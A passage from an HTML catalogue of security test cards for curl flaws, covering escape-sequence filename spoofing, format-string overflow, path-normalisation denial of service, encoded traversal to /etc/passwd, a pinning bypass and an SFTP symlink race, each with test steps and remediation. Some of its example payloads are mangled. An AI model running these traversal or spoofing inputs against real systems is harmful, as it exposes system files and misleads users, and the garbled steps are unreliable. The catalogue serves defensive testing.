<p><strong class="section-heading section-impact">Impact:</strong> Denial of Service (application crash) or potential Arbitrary Code Execution if memory corruption allows control flow hijacking.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Always use safe string handling functions that perform bounds checking (e.g., <code>strncpy</code>, <code>snprintf</code>) when copying data into fixed-size buffers. Employ compiler-based address sanitizers during development and testing.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Malicious Filename Injection via Curl</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A server can be tricked into providing a filename to a client&#x27;s <code>curl</code> command that includes special escape sequences. These sequences can manipulate the terminal output, potentially displaying misleading error messages or concealing malicious content. This can lead to user confusion or, in some cases, trick users into believing a download failed while a different file is being saved.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Set up a local HTTP server that serves files with a dynamically generated filename.</li>
<li>The filename should include escape sequences like <code>\033[1G\033[2K\033[A</code> (carriage return, clear line, up arrow, clear line) followed by an arbitrary error message (e.g., &quot;curl: (6) Could not resolve host: google.com&quot;).</li>
<li>Use <code>curl</code> with options <code>-J</code>, <code>-O</code>, and <code>-w</code> to download the file and display the filename. For example: <code>curl -J -O -w &quot;Saved to: %{filename<em>effective}&quot; &lt;TARGET</em>URL&gt;</code>.</li>
<li>Observe the terminal output to confirm the presence of the crafted error message.</li>
<li>Verify the downloaded file&#x27;s contents and filename are as expected, compared with the crafted filename.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> User confusion, potential for information disclosure, misleading error messages.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong>  Sanitize filenames before providing them to clients, particularly when dynamically generated.  Validate or escape escape sequences in filenames. Consider disabling or carefully controlling filename generation and display within HTTP server responses.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Buffer Overflow in String Formatting</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A buffer overflow vulnerability occurs when formatted strings are written to a user-provided buffer without proper size validation. This can lead to arbitrary code execution or denial of service if the format string is maliciously crafted to exceed the buffer&#x27;s capacity. This test aims to highlight this type of vulnerability, regardless of the specific formatting function used.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Obtain a target application that uses a string formatting function to write to a user-provided buffer.</li>
<li>Create a buffer of a known, small size (e.g., 16 bytes).</li>
<li>Craft a malicious format string containing format specifiers (e.g., <code>%s</code>, <code>%n</code>) that generate output larger than the buffer&#x27;s size. An example payload is: <code>&lt;PAYLOAD&gt;</code> (e.g., <code>A&quot;<em>100%sB&quot;</em>50</code>).</li>
<li>Pass the malicious format string and the buffer to the vulnerable string formatting function.</li>
<li>Observe the resulting behavior: memory corruption, crashes, or unexpected output indicating a buffer overflow.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Arbitrary code execution, memory corruption, information disclosure, and denial of service.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement bounds checking when writing formatted output to user-provided buffers. Use safer string formatting functions that prevent overflows by default. Sanitize user-provided format strings.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Denial of Service via URL Path Normalization</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> The <code>dedotdotify()</code> function, used for URL path normalization, exhibits quadratic time complexity (O(n²)) when processing paths with numerous <code>../</code> sequences. This can lead to excessive CPU usage and denial of service when handling malicious URLs.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Craft a URL containing a long sequence of <code>/../</code> segments. For example: <code>http://&lt;TARGET_URL&gt;/a/b/c/.../x/y/z/../../../../..</code></li>
<li>Use <code>curl</code> or a similar HTTP client to request the crafted URL.</li>
</ol>
<pre><code>   curl &quot;http://&lt;TARGET_URL&gt;/a/b/c/.../x/y/z/../../../../..&quot;</code></pre>
<ol>
<li>Monitor the CPU usage of the server or application processing the request. Observe a significant increase in CPU consumption compared to a normal request.</li>
<li>Test with increasingly longer sequences of <code>/../</code> to verify the quadratic time complexity. For instance, a URL like <code>http://&lt;TARGET_URL&gt;/a/b/c/../..</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong>  Denial of service due to excessive CPU consumption, leading to slow response times or service unavailability.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong>  Rewrite the vulnerable <code>dedotdotify()</code> function to use an O(n) algorithm, such as tracking segment boundaries using a linked list or array, or utilize the <code>CURLU<em>PATH</em>AS_IS</code> option where appropriate, after careful security review. Implement input validation to limit URL path lengths.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">URL-Encoded Path Traversal Bypass</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> Applications using <code>file://</code> URLs with URL-encoded path traversal sequences (<code>%2f%2e%2e%2f</code>) can be tricked into accessing arbitrary files due to improper normalization of URLs. This bypasses standard path traversal protections and can lead to sensitive information disclosure.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Construct a <code>file://</code> URL with URL-encoded path traversal sequences to access a sensitive file. For example: <code>file:///%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code>.</li>
<li>Send the URL to the target application.</li>
<li>Observe if the application reads and returns the content of the targeted file.</li>
<li>Verify that the URL normalization function fails to decode and sanitize the URL properly.</li>
<li>Use the following command as an example to demonstrate the bypass: <code>curl &quot;file:///%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&quot;</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive files on the system, potentially exposing credentials, configuration data, or application source code.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Properly decode and sanitize all URLs, including handling URL-encoded characters, before performing any file operations. Validate the normalized path to ensure it remains within the intended directory.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Certificate Pinning Bypass</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a Man-in-the-Middle attacker to bypass Certificate Pinning, even when enabled, if insecure connections are allowed. This occurs due to inconsistent handling of certificate verification flags across different TLS backends.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Configure a curl client with a specific pinned public key. For example, <code>--pinnedpubkey &quot;sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;</code>.</li>
<li>Disable peer verification by using the <code>-k</code> or <code>--insecure</code> flag.</li>
<li>Initiate an HTTP/3 connection to &lt;TARGET<em>URL&gt; using the configured curl client. Example: <code>curl -k --http3 --pinnedpubkey &quot;sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot; &lt;TARGET</em>URL&gt;</code>.</li>
<li>Verify the connection proceeds without the expected pinning error. The presence of a successful connection, rather than the expected &quot;pinned public key mismatch&quot; error, indicates a bypass.</li>
<li>Compare the behavior with a standard build (like OpenSSL) where disabling verification prevents certificate pinning from working as expected.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> A Man-in-the-Middle attacker can intercept and decrypt traffic, bypassing the intended protection of certificate pinning.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure consistent handling of certificate verification flags across all TLS backends. Certificate pinning should function independently of other verification settings.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Network">
      <button type="button" class="card-toggle">
        <span class="card-title">Heap Buffer Overflow in DNS Resolution</span>
        <span class="card-meta-mini">
          <span class="badge">Network</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A heap buffer overflow can occur during DNS resolution when using a fixed-size buffer and incorrect pointer arithmetic, leading to potential memory corruption. This vulnerability specifically affects systems using a particular operating system and socket library. It can lead to denial of service or, in some cases, potentially allow for code execution.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Configure a target system to use AmigaOS with the bsdsocket.library backend.</li>
<li>Attempt to resolve a hostname using the <code>curl</code> command line tool, influencing the DNS response to be an attacker-controlled hostname.</li>
<li>Observe if the <code>curl</code> or related library processes crash or exhibit unexpected behavior.</li>
<li>Use a debugger to observe memory access patterns during DNS resolution and confirm that writes exceed the bounds of the allocated buffer. An example payload might be: <code>curl &lt;TARGET<em>URL&gt;</code> where <code>&lt;TARGET</em>URL&gt;</code> resolves to a specially crafted hostname.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Denial of service through process crashes or heap memory corruption, with a potential for arbitrary code execution depending on the heap layout and implemented mitigations.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement dynamic buffer allocation that accounts for structure alignment and padding requirements when performing DNS resolution. Validate the size and offset calculations to prevent out-of-bounds writes.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Network">
      <button type="button" class="card-toggle">
        <span class="card-title">TOCTOU Race Condition in Resumed SFTP Uploads</span>
        <span class="card-meta-mini">
          <span class="badge">Network</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A race condition exists in SFTP resume functionality where a file&#x27;s state is checked before being opened, allowing an attacker to swap the target file with a symbolic link. This enables arbitrary data appending to files accessible by the authenticated user.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Establish a connection to an SFTP server using a tool like <code>curl</code>.</li>
<li>Authenticate to the server.</li>
<li>Initiate a file upload using <code>curl</code> with the <code>-C -</code> flag to resume from the end.</li>
<li>Simultaneously, an attacker on the server must rapidly replace the target file with a symbolic link to a sensitive file. For instance: <code>mkfifo /tmp/symlink; ln -s /tmp/symlink /path/to/target_file</code>.</li>
<li>Observe whether data appended during the upload is written to the sensitive file pointed to by the symbolic link.</li>
<li>Use backticks to run commands like: <code>curl -u &lt;USERNAME&gt;:&lt;PASSWORD&gt; -C - &lt;TARGET_URL&gt;:&lt;PAYLOAD&gt;</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker with authenticated access can append arbitrary data to files the user has write access to, potentially leading to remote code execution, denial of service, or log injection.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Verify that the file opened matches the file whose size was initially checked before continuing with the upload process. Use file attributes like inode number to perform the validation.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    
    </section>
  </div>

  <script>
    const debounce = (fn, delay = 200) => {
      let timeout;
      return (...args) => {
        clearTimeout(timeout);
        timeout = setTimeout(() => fn(...args), delay);
      };
    };

    const searchInput = document.getElementById('searchInput');
    const categoryFilter = document.getElementById('categoryFilter');
    const cards = Array.from(document.querySelectorAll('.card'));

    function normalize(text) {
      return text.toLowerCase();
    }

    function applyFilters() {
      const term = normalize(searchInput.value);
      const category = categoryFilter.value;
      cards.forEach(card => {
        const cardText = normalize(card.innerText);
        const matchesText = !term || cardText.includes(term);
        const matchesCategory = category === 'all' || card.dataset.category === category;
        card.style.display = (matchesText && matchesCategory) ? 'block' : 'none';
      });
    }

    searchInput.addEventListener('input', debounce(applyFilters, 150));
    categoryFilter.addEventListener('change', applyFilters);
    applyFilters();

    document.querySelectorAll('.card-toggle').forEach(button => {
      button.addEventListener('click', () => {
        const card = button.closest('.card');
        card.classList.toggle('open');
      });
    });

  </script>
</body>
</html>
